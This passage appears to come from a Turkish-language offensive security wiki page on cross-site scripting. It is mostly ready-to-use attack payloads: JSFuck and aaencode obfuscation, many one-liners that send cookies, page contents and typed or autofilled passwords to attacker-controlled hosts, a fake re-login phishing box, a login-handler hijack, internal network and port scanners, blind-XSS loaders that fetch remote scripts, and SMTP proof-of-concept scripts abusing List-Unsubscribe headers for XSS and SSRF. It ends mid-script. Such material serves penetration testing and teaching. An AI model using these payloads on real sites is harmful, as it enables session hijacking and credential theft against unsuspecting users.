]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS yaygın payloads

### Birden fazla payloads bir arada


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

Kullanıcının iframe'den çıkmadan sayfada gezinmesini sağlayın ve onun eylemlerini çalın (formlarda gönderilen bilgiler dahil):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Cookies'i Almak
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> Eğer cookie üzerinde HTTPOnly flag'i set edilmişse, **JavaScript'ten cookies'a erişemeyeceksiniz**. Ancak yeterince şanslıysanız, [bu korumayı atlatmanın bazı yolları](../hacking-with-cookies/index.html#httponly) mevcut.

### Sayfa İçeriğini Çal
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Dahili IP'leri Bul
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Kısa süreler yanıt veren bir portu gösterir_ _Daha uzun süreler yanıt olmadığını gösterir._

Chrome'da yasaklanan ports listesini [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) ve Firefox'ta [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist) inceleyin.

### credentials sormak için kutu
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Otomatik doldurma şifrelerinin yakalanması
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Parola alanına herhangi bir veri girildiğinde, kullanıcı adı ve parola saldırganın sunucusuna gönderilir; hatta istemci kayıtlı bir şifreyi seçse ve hiçbir şey yazmasa bile kimlik bilgileri ex-filtrated olacak.

### Hijack form handlers to exfiltrate credentials (const shadowing)

If a critical handler (e.g., `function DoLogin(){...}`) is declared later in the page, and your payload runs earlier (e.g., via an inline JS-in-JS sink), define a `const` with the same name first to preempt and lock the handler. Later function declarations cannot rebind a `const` name, leaving your hook in control:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Notlar
- Bu, yürütme sırasına dayanır: enjeksiyonunuz meşru deklarasyondan önce çalışmalıdır.
- Eğer payload'unuz `eval(...)` içinde sarılıysa, `const/let` bağlamaları global olmaz. Gerçek bir global, yeniden bağlanamayan binding sağlamak için bölüm “Deliverable payloads with eval(atob()) and scope nuances”'ta anlatılan dinamik `<script>` enjeksiyon tekniğini kullanın.
- Anahtar kelime filtreleri kodu engellediğinde, yukarıda gösterildiği gibi Unicode-escaped identifiers veya `eval(atob('...'))` delivery ile birleştirin.

### Keylogger

Sadece github'da arama yaparken birkaç farklı örnek buldum:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- Ayrıca metasploit `http_javascript_keylogger` kullanabilirsiniz

### Stealing CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### PostMessage mesajlarını çalma
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### PostMessage-origin script loaders (opener-gated)

Eğer bir sayfa **`postMessage`'den gelen `event.origin`'u saklıyor ve daha sonra bunu bir script URL'sine ekliyorsa**, gönderen yüklenen JS'nin **origin**ini kontrol eder:
```javascript
window.addEventListener('message', (event) => {
if (event.data.msg_type === 'IWL_BOOTSTRAP') {
localStorage.setItem('CFG', {host: event.origin, pixelID: event.data.pixel_id});
startIWL(); // later loads `${host}/sdk/${pixelID}/iwl.js`
}
});
```
Exploitation recipe (from CAPIG):

- **Gates**: yalnızca `window.opener` var olduğunda ve `pixel_id` allowlist'te olduğunda tetiklenir; **origin asla kontrol edilmez**.
- **Use CSP-allowed origin**: hedefin CSP'si tarafından zaten izin verilen bir domaine pivot yapın (ör. analytics'e izin veren oturum kapalı yardım sayfaları gibi `*.THIRD-PARTY.com`) ve takeover/XSS/upload ile orada `/sdk/<pixel_id>/iwl.js` barındırın.
- **Restore `opener`**: Android WebView'da, `window.name='x'; window.open(target,'x')` sayfayı kendi `opener`'ı yapar; kötü amaçlı `postMessage`'i ele geçirilmiş bir iframe'den gönderin.
- **Trigger**: iframe `{msg_type:'IWL_BOOTSTRAP', pixel_id:<allowed>}` gönderir; parent daha sonra CSP-allowed origin'den saldırgan `iwl.js`'i yükler ve çalıştırır.

Bu, origin kontrolü olmayan `postMessage` doğrulamasını, politikanın zaten izin verdiği herhangi bir origin'e erişebilirseniz CSP'yi atlatan bir **remote script loader primitive**'e dönüştürür.

### Supply-chain stored XSS via backend JS concatenation

Backend **JS dizelerini kullanıcı kontrollü değerlerle birleştirerek paylaşılan bir SDK oluşturduğunda**, herhangi bir tırnak/yapı bozucu her tüketiciye servis edilen script enjekte edebilir:

- Örnek desen (Meta CAPIG): sunucu doğrudan `capig-events.js` içine `cbq.config.set("<pixel>","IWLParameters",{params: <user JSON>});` ekler.
- `'` veya `"]}` enjekte etmek literal/nesneyi kapatır ve saldırgan JS ekler, bu da onu yükleyen her site (first-party and third-party) için dağıtılmış SDK'da **stored XSS** oluşturur.

### Stored XSS in generated reports when escaping is disabled

Eğer yüklenen dosyalar ayrıştırılıp metadata'ları kaçış devre dışı bırakılarak (`|safe`, custom renderers) HTML raporlarına yazdırılıyorsa, bu metadata bir **stored XSS sink**'idir. Örnek akış:
```python
xmlhost = data.getAttribute(f'{ns}:host')
ret_list.append(('dialer_code_found', (xmlhost,), ()))
'title': a_template['title'] % t_name  # %s fed by xmlhost
```
Bir Django template'i `{{item|key:"title"|safe}}` render ediyor; bu nedenle saldırganın HTML'i çalıştırılır.

**Exploit:** rapora ulaşan herhangi bir manifest/config alanına **entity-encoded HTML** yerleştirin:
```xml
<data android:scheme="android_secret_code"
android:host="&lt;img src=x onerror=alert(document.domain)&gt;"/>
```
Rendered with `|safe`, the report outputs `<img ...>` and fires JS on view.

**Hunting:** parse edilmiş alanları `%s`/f-strings içinde yeniden kullanan ve auto-escape'i devre dışı bırakan report/notification builder'larını arayın. Yüklenen bir manifest/log/archive içindeki tek bir kodlanmış tag, her görüntüleyici için XSS'i kalıcı kılar.

### Abusing Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Accessing Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Ayrıca şunu da kullanabilirsiniz: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Gizli İçeriğe Erişim

Bu [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) sayesinde bazı değerler JS'ten kaybolsa bile farklı nesnelerdeki JS özniteliklerinde hâlâ bulunabileceğini öğrenmek mümkün. Örneğin, bir REGEX girişi, değeri kaldırıldıktan sonra bile hâlâ bulunabilir:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS ile diğer zafiyetleri suistimal etme

### Markdown'de XSS

Görüntülenecek Markdown kodu enjekte edilebilir mi? Belki XSS elde edersiniz! Kontrol et:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS'ten SSRF'e

Önbellekleme kullanan bir **site**de XSS mi buldunuz? Edge Side Include Injection yoluyla bunu **SSRF'e yükseltmeyi** bu payload ile deneyin:
```python
<esi:include src="http://yoursite.com/capture" />
```
Bunu cookie kısıtlamalarını atlatmak, XSS filtrelerini aşmak ve çok daha fazlası için kullanın!\
Bu teknik hakkında daha fazla bilgi: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### Dinamik oluşturulan PDF'te XSS

Eğer bir web sayfası kullanıcı kontrollü girdi kullanarak bir PDF oluşturuyorsa, PDF'i oluşturan botu **kandırarak** **keyfi JS kodu çalıştırmasını** sağlayabilirsiniz.\
Dolayısıyla, eğer **PDF oluşturucu bot** bazı **HTML** **etiketleri** bulursa, bunları **yorumlayacak** ve bu davranışı **kötüye kullanarak** bir **Server XSS** meydana getirebilirsiniz.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

Eğer HTML etiketleri enjekte edemiyorsanız, **PDF veri enjekte etmeyi** denemeye değer olabilir:


{{#ref}}
pdf-injection.md
{{#endref}}

### Amp4Email'de XSS

AMP, mobil cihazlarda web sayfası performansını hızlandırmayı amaçlayan, işlevselliği sağlamak için JavaScript ile desteklenen HTML etiketleri içeren ve hız ile güvenliğe odaklanan bir teknolojidir. Çeşitli özellikler için bir dizi bileşeni destekler; bunlara [AMP components](https://amp.dev/documentation/components/?format=websites) üzerinden erişilebilir.

The [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) formatı belirli AMP bileşenlerini e-postalara genişleterek alıcıların içerikle doğrudan e-postaları içinde etkileşimde bulunmasını sağlar.

Örnek [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Suiistimali (Webmail XSS & SSRF)

RFC 2369 `List-Unsubscribe` header'ı, birçok webmail ve mail istemcisinin otomatik olarak "Unsubscribe" butonlarına dönüştürdüğü saldırgan kontrollü URI'ler barındırır. Bu URI'ler doğrulanmadan render edildiğinde veya getildiğinde, header hem stored XSS (unsubscribe link DOM'a konulursa) hem de SSRF (sunucu kullanıcının adına unsubscribe isteğini yaparsa) için bir enjeksiyon noktası haline gelir.

#### Stored XSS via `javascript:` URIs

1. Header'ın bir `javascript:` URI'sine işaret ettiği bir e-postayı kendinize gönderin; spam filtrelerinin silmemesi için mesajın geri kalanını zararsız tutun.
2. UI'nın değeri render edip etmediğini doğrulayın (birçok istemci bunu "List Info" panelinde gösterir) ve ortaya çıkan `<a>` etiketinin `href` veya `target` gibi saldırgan kontrollü öznitelikleri devralıp devralmadığını kontrol edin.
3. Bağlantı `target="_blank"` kullandığında çalıştırmayı tetikleyin (ör. CTRL+click, middle-click veya "open in new tab"); tarayıcılar verilen JavaScript'i webmail uygulamasının origin'inde değerlendirecektir.
4. Stored-XSS primitive'ini gözlemleyin: payload e-postayla birlikte kalır ve çalışması için yalnızca bir tıklama gerekir.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
URI içindeki newline byte'ı (`%0a`), Horde IMP H5 gibi zafiyetli istemcilerde bile olağandışı karakterlerin render hattından sağ çıktığını ve a etiketi içinde dizgenin olduğu gibi (verbatim) görüntüleneceğini gösterir.

<details>
<summary>Kötü amaçlı bir List-Unsubscribe başlığı ileten Minimal SMTP PoC</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Sunucu tarafı abonelik iptali proxy'leri -> SSRF

Bazı istemciler, örneğin Nextcloud Mail app, abonelik iptal eylemini sunucu tarafında proxy'ler: düğmeye tıklamak sunucunun verilen URL'yi kendisinin fetch etmesini sağlar. Bu, header'ı bir SSRF primitive'ine dönüştürür; özellikle yöneticiler `'allow_local_remote_servers' => true` olarak ayarladığında (belgelendiği yer: [HackerOne report 2902856](https://hackerone.com/reports/2902856)), bu loopback ve RFC1918 aralıklarına yönelik isteklere izin verir.

1. **Bir e-posta oluşturun**; `List-Unsubscribe` saldırgan tarafından kontrol edilen bir endpoint'i hedeflesin (blind SSRF için Burp Collaborator / OAST kullanın).
2. **`List-Unsubscribe-Post: List-Unsubscribe=One-Click` değerini koruyun** ki UI tek tıklamayla abonelik iptali düğmesini göstersin.
3. **Güven şartlarını sağlayın**: örneğin Nextcloud, mesaj DKIM'den geçtiğinde yalnızca HTTPS unsubscribe istekleri yapar; bu yüzden saldırgan e-postayı kontrol ettikleri bir domain ile imzalamalıdır.
4. **Mesajı hedef sunucu tarafından işlenen bir mailbox'a teslim edin** ve bir kullanıcının abonelik iptali düğmesine tıklamasını bekleyin.
5. **Collaborator endpoint'te sunucu tarafı callback'i gözlemleyin**, ardından primitive doğrulandıktan sonra iç adreslere pivot yapın.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>SSRF testi için DKIM ile imzalanmış List-Unsubscribe mesajı</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
